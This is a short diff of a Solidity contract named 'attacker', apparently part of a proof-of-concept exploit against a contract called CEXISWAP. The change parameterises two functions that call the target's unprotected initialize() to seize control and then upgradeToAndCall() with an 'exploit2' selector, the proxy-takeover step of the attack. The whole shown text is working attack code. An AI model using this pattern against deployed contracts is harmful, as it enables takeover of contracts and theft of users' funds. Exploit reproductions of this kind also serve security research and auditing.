@@ -83,20 +83,27 @@ contract attacker {
         owner = msg.sender;
     }
 
-    function initialize() external {
+    function initialize(
+        string memory _str1, 
+        string memory _str2, 
+        address _addr1, 
+        address _addr2, 
+        address _addr3, 
+        address _addr4
+    ) external {
         CEXISWAP.initialize(
-            "HAX",
-            "HAX",
-            address(this),
-            address(this),
-            address(this),
-            address(this)
+            _str1,
+            _str2,
+            _addr1,
+            _addr2,
+            _addr3,
+            _addr4
         );
     }
 
-    function upgradeToAndCall() external {
+    function upgradeToAndCall(address _addr) external {
         CEXISWAP.upgradeToAndCall(
-            address(this),
+            _addr,
             abi.encodePacked(this.exploit2.selector)
         );
     }
